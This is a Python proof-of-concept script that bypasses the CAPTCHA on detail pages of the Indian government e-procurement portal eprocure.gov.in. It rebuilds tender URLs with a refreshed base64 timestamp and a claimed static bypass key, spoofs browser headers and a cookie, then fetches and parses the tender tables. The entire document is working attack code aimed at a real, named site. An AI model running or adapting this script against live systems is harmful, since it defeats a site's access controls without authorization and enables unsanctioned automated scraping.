#!/usr/bin/env python3
"""
eprocure.gov.in CPPP Detail View CAPTCHA Bypass (Proof of Concept)
Demonstrates how to fetch tender detail pages programmatically without solving CAPTCHAs.
"""

import time
import base64
import requests
from bs4 import BeautifulSoup

# Define URLs
original_6part_url = "https://eprocure.gov.in/cppp/tendersfullview/MTM3OTA3NjU=A13h1OGQ2NzAxYTMwZTJhNTIxMGNiNmEwM2EzNmNhYWZhODk=A13h1OGQ2NzAxYTMwZTJhNTIxMGNiNmEwM2EzNmNhYWZhODk=A13h1MTc4MTEyODMzMA==A13h1QVdFSUwvR0NGL0VPL1RFL0RvTyAvQ1cvMjYtMjcvMDE=A13h1MjAyNl9BV0VJTF8yNzgxMTFfMQ=="
base_search_url = "https://eprocure.gov.in/cppp/tendersearch/cpppdata/bydGVuZGVyQTEzaDFBRFZBTkNFRCBXRUFQT05TIEFORCBFUVVJUE1FTlQgSU5ESUEgTFRELUFXRUlMQTEzaDFzZWxlY3RBMTNoMW51bGxBMTNoMW51bGw="

# Static MD5 key used by eprocure globally to verify CAPTCHA solves
BYPASS_KEY_B64 = "OGQ2NzAxYTMwZTJhNTIxMGNiNmEwM2EzNmNhYWZhODk="

def construct_bypass_url(detail_url):
    """
    Transforms a 6-part captcha-bound URL into a 7-part bypassed URL
    by refreshing the timestamp and appending the bypass key.
    """
    url_base, b64_hash = detail_url.split("/tendersfullview/")
    parts = b64_hash.split("A13h1")
    
    # 1. Update timestamp block (index 3) with current Unix epoch
    current_ts = str(int(time.time()))
    parts[3] = base64.b64encode(current_ts.encode('utf-8')).decode('utf-8')
    
    # 2. Append bypass token (7th block)
    if len(parts) == 6:
        parts.append(BYPASS_KEY_B64)
        
    return f"{url_base}/tendersfullview/{'A13h1'.join(parts)}"

def main():
    print("[*] Starting CAPTCHA Bypass Proof of Concept...")
    
    # Configure Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": base_search_url
    }
    
    session = requests.Session()
    session.cookies.set("cookieWorked", "yes", domain="eprocure.gov.in", path="/")
    
    # Step 1: Initialize session state by requesting search page
    print("[*] Step 1: Initializing session on search page...")
    session.get(base_search_url, headers=headers, timeout=15)
    
    # Step 2: Construct the final 7-part bypass URL
    print("[*] Step 2: Constructing CAPTCHA-bypassed detail URL...")
    bypass_url = construct_bypass_url(original_6part_url)
    print(f"    Constructed URL: {bypass_url}")
    
    # Step 3: Fetch detail page content
    print("[*] Step 3: Fetching detail page...")
    response = session.get(bypass_url, headers=headers, timeout=20)
    
    # Step 4: Parse & Print results
    soup = BeautifulSoup(response.text, "html.parser")
    tables = soup.find_all("table")
    
    print("\n[+] Success! Parsed Tender Details:")
    print("=" * 60)
    for idx, table in enumerate(tables):
        rows = table.find_all("tr")
        for row in rows:
            cells = row.find_all(["td", "th"])
            cell_texts = [c.get_text(separator=" ", strip=True) for c in cells]
            
            # Extract key-value pairs separated by a ":" element
            found_pair = False
            for i in range(1, len(cell_texts) - 1):
                if cell_texts[i] == ":":
                    key = cell_texts[i-1]
                    val = cell_texts[i+1]
                    print(f"{key:<30} : {val}")
                    found_pair = True
            
            # Fallback for simple 2-cell rows without an explicit ":" cell
            if not found_pair and len(cell_texts) == 2:
                print(f"{cell_texts[0]:<30} : {cell_texts[1]}")
    print("=" * 60)

if __name__ == "__main__":
    main()
